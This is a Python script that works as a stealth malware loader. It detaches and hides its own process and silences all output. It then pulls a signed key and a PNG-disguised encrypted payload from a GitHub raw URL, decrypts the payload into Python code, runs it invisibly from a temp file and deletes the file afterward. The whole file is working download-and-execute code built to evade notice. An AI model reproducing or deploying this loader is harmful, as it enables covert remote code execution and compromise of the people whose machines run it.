import os
import sys
import urllib.request
import hashlib
import hmac
import base64
import tempfile
import subprocess

def run_silently():
    if os.name == 'nt':
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = 0
        subprocess.Popen(
            [sys.executable, __file__],
            creationflags=subprocess.CREATE_NO_WINDOW,
            startupinfo=startupinfo,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        sys.exit(0)
    else:
        if os.fork(): sys.exit(0)
        os.setsid()
        null_fd = os.open(os.devnull, os.O_RDWR)
        for fd in (0, 1, 2): os.dup2(null_fd, fd)
        os.close(null_fd)

def fetch_key(url):
    try:
        with urllib.request.urlopen(url) as res:
            decoded = base64.b64decode(res.read())
        key, signature = decoded[:32], decoded[32:64]
        salt = b'y0u_c4n7_s33_m3__x3n0n'
        return key if hmac.compare_digest(hmac.new(salt, key, hashlib.sha256).digest(), signature) else None
    except:
        return None

def secure_decrypt(data, key):
    kdf = hashlib.pbkdf2_hmac('sha256', key, b'x3n0n_kdf_salt', 100000, 64)
    decrypted = bytearray()
    for i, byte in enumerate(data):
        k1 = kdf[i % 32]
        k2 = kdf[32 + (i % 32)]
        k3 = kdf[(i * 17) % 64]
        decrypted.append(byte ^ k1 ^ k2 ^ k3)
    return bytes(decrypted)

def remove_padding(data):
    try:
        content = data[16:-16]
        pad_len = content[-1]
        return content[:-pad_len] if 1 <= pad_len <= 64 else content
    except:
        return data

def download_decrypt_execute(key_url, file_url):
    try:
        # Fetch key
        key = fetch_key(key_url)
        if not key: return False
        
        # Download file
        with urllib.request.urlopen(file_url) as res:
            file_data = res.read()
        
        # Validate header
        if not file_data.startswith(b'\x89PNG\r\n\x1a\n'): return False
        if file_data[8:16] != hashlib.sha256(key).digest()[:8]: return False
        
        # Decrypt
        decrypted = secure_decrypt(file_data[16:], key)
        cleaned = remove_padding(decrypted)
        
        # Execute
        with tempfile.NamedTemporaryFile(delete=False, suffix='.py') as tmp:
            tmp.write(cleaned)
            tmp_path = tmp.name
        
        subprocess.Popen(
            [sys.executable, tmp_path],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=subprocess.CREATE_NO_WINDOW if os.name=='nt' else 0
        )
        
        # Schedule cleanup
        if os.name == 'nt':
            subprocess.Popen(f"timeout 10 & del /f {tmp_path}", shell=True, 
                             creationflags=subprocess.CREATE_NO_WINDOW)
        else:
            subprocess.Popen(f"sleep 10; rm -f {tmp_path}", shell=True)
        return True
    except:
        return False

def main():
    if not os.environ.get('_STEALTH_MODE'):
        os.environ['_STEALTH_MODE'] = '1'
        run_silently()
    
    key_url = "https://raw.githubusercontent.com/d-x3n0n/t3n3t/main/repo/key.txt"
    file_url = "https://raw.githubusercontent.com/d-x3n0n/t3n3t/main/repo/python_script.png"
    
    download_decrypt_execute(key_url, file_url)
    sys.exit(0)

if __name__ == "__main__":
    sys.stdout = open(os.devnull, 'w')
    sys.stderr = open(os.devnull, 'w')
    main()
